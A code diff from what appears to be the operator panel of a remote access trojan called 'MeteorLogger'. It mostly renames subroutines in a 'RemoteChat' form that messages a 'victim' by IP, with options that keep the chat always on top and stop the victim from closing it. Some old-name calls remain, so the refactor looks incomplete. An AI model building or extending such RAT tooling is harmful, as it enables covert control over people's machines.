@@ -24,7 +24,7 @@ Public Class RemoteChat
         sendButton.Enabled = messageTB.Text.Trim <> ""
     End Sub
 
-    Private Sub refreshChat()
+    Private Sub RefreshChat()
         Try
 
             chatWindow.Clear()
@@ -47,11 +47,11 @@ Public Class RemoteChat
         Catch ex As AccessViolationException
             MsgBox("Memory exception occured. Click OK to reload the tchat panel-side.",
                 MsgBoxStyle.Exclamation, "MeteorLogger - Remote chat @" & targetIp)
-            refreshChat()
+            RefreshChat()
         End Try
     End Sub
 
-    Private Sub displayVictimLeave()
+    Private Sub DisplayVictimLeave()
         For i = 0 To 4
             chatWindow.Text &= Space(16) & "|" & Space(16) & vbCrLf
         Next
@@ -61,7 +61,7 @@ Public Class RemoteChat
         messageTB.Enabled = False
     End Sub
 
-    Private Sub sendButtonClickSub()
+    Private Sub SendButtonClickSub()
         Dim showInTaskBar = "0", alwaysOnTop = "1", allowCloseChat = "0"
 
         If allowCloseChatCB.Checked Then allowCloseChat = "1"
@@ -76,7 +76,7 @@ Public Class RemoteChat
                              "&actioncontent4=" & Convert.ToBase64String(Encoding.UTF8.GetBytes(messageTB.Text)))
 
         messageList.Add(New Tuple(Of String, Boolean)(messageTB.Text, True))
-        refreshChat()
+        RefreshChat()
         messageTB.Clear()
 
     End Sub
@@ -86,7 +86,7 @@ Public Class RemoteChat
         sendButtonClickSub()
     End Sub
 
-    Private Sub chatFluxManage()
+    Private Sub ChatFluxManage()
         Dim lastMessageReceived As String = ""
 
         While True
@@ -105,6 +105,9 @@ Public Class RemoteChat
 
             Dim parsedMsg As String() = receivedMessageQuery.Split("|")
 
+            ' TODO : What to do when the client's form isn't closed properly ?
+            ' For example if you RAT shutdown it and the form_close event doesn't
+            ' trigger ?
             If parsedMsg(0) = "close" And Not firstIter Then
                 displayVictimLeave()
                 Exit While
